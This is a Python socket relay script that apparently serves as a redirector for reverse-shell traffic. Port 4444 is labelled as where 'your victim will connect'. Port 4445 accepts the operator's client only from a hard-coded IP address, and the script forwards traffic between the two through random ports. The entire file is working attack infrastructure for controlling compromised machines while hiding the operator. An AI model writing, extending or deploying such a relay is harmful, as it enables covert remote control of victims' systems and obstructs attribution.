import threading
import socket
import random

# where your victim will connect
SRC_LISTEN_HOST = "0.0.0.0"
SRC_LISTEN_PORT = 4444

# where client.py will connect
DST_LISTEN_HOST = "0.0.0.0"
DST_LISTEN_PORT = 4445
DST_HOST = "168.234.83.163" # server will refuse to accept connection that is not coming from this ip. this is the only way it verifies if its you

dst_sock = None

def server_listener(listen_host, listen_port, func_pass):
    try:
        server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_sock.bind((listen_host, listen_port))
        server_sock.listen()
        print(f"notice: listening to {listen_host}:{listen_port}")
    except Exception as e:
        print(f"error: unable to listen to {listen_host}:{listen_port} e: {e}")
        return

    while True:
        client_sock, client_address = server_sock.accept()
        threading.Thread(target=func_pass, args=[client_sock], daemon=True).start()

def src_handle(sock):
    sock_ip, sock_port = sock.getpeername()
    sock_address = f"{sock_ip}:{sock_port}"

    print(f"notice: src connected: {sock_address}")

    sock2 = create_dst_sock()

    if not sock2:
        sock.close()
        return

    threading.Thread(target=packet_router, args=[sock, sock2], daemon=True).start()
    threading.Thread(target=packet_router, args=[sock2, sock], daemon=True).start()

def dst_handle(sock):
    sock_ip, sock_port = sock.getpeername()
    sock_address = f"{sock_ip}:{sock_port}"

    if not sock_ip == DST_HOST:
        print(f"warning: DST_HOST is not {sock_address}")
        sock.close()
        return

    print(f"notice: dst connected: {sock_address}")

    global dst_sock
    dst_sock = sock

    try:
        while True:
            data = sock.recv(1024)

            if len(data) == 0: break

    except Exception:
        return

    finally:
        print(f"error: dst disconnected: {sock_address}")

def create_dst_sock():
    if not dst_sock: return

    port_number = random.randrange(10000, 65535)

    server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_sock.settimeout(5)
    server_sock.bind((DST_LISTEN_HOST, port_number))
    server_sock.listen()

    try:
        dst_sock.send(f"{port_number}".encode())
        client_sock, client_address = server_sock.accept()
    except Exception:
        return

    return client_sock

def packet_router(src, dst):
    src_address, src_port = src.getpeername()
    dst_address, dst_port = dst.getpeername()

    print(f"notice: started packet router {src_address} -> {dst_address}")

    try:
        while True:
            data = src.recv(4096)

            if len(data) == 0: break

            dst.send(data)
    except Exception:
        return

    finally:
        src.close()
        dst.close()
        print(f"notice: ended packet router {src_address}:{src_port} -> {dst_address}:{dst_port}")

def main():
    threading.Thread(target=server_listener, args=[SRC_LISTEN_HOST, SRC_LISTEN_PORT, src_handle], daemon=True).start()
    threading.Thread(target=server_listener, args=[DST_LISTEN_HOST, DST_LISTEN_PORT, dst_handle], daemon=True).start()

    try:
        while True:
            pass
    except KeyboardInterrupt:
        return

if __name__ == "__main__":
    main()
